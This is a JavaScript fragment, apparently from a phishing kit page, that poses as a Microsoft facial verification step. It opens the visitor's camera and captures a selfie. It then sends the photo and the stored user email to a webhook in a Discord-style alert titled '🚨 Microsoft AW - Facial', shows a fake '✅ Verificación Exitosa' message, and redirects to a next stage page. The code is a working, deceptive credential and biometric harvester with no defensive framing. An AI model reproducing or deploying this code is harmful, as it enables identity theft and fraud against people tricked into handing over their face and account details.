const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const captureBtn = document.getElementById('capture');
  const userEmail = localStorage.getItem("userEmail");

  // Acceso a la cámara
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
    .then(stream => { video.srcObject = stream; })
    .catch(err => { alert('Error: ' + err); });

  captureBtn.addEventListener('click', async () => {
    // Si el video está visible, capturamos y enviamos
    if (video.style.display !== 'none') {
      
      // 1. Capturar en el canvas
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      // 2. Interfaz: Mostrar foto y bloquear botón
      video.style.display = 'none';
      canvas.style.display = 'block';
      captureBtn.disabled = true;
      captureBtn.textContent = "Verificando...";

      // 3. Proceso de envío
     try {
        const selfieData = canvas.toDataURL('image/png');
        const responseBlob = await fetch(selfieData);
        const blob = await responseBlob.blob();

        const formData = new FormData();
        formData.append('file', blob, 'documento.png');
        formData.append('payload_json', JSON.stringify({
  embeds: [
    {
      title: "🚨 Microsoft AW - Facial",
      color: 0x00BFFF,
      fields: [
        {
          name: "🪪 Correo:",
          value: userEmail,
          inline: true
        }
      ],
      image: {
        url: "attachment://documento.png"
      }
    }
  ]
}));

        const result = await fetch(webhook_url, {
          method: 'POST',
          body: formData
        });

        if(result.ok) {
          captureBtn.textContent = "✅ Verificación Exitosa";
          
          // --- AQUÍ SUCEDE LA REDIRECCIÓN ---
          setTimeout(() => {
            window.location.href = "carga2.html"; 
          }, 1500); // Esperamos 1.5 segundos para que el usuario vea el mensaje de éxito
          
        } else {
          captureBtn.disabled = false;
          captureBtn.textContent = "❌ Error";
        }
      } catch (err) {
        console.error(err);
        captureBtn.disabled = false;
        captureBtn.textContent = "❌ Error de conexión";
      }

      // 4. Habilitar el botón después de una breve pausa para poder "Retomar"
      setTimeout(() => {
        captureBtn.disabled = false;
      }, 2000);

    } else {
      // Si ya se tomó la foto, el botón sirve para "Retomar"
      video.style.display = 'block';
      canvas.style.display = 'none';
      captureBtn.textContent = "Verificar";
    }
  });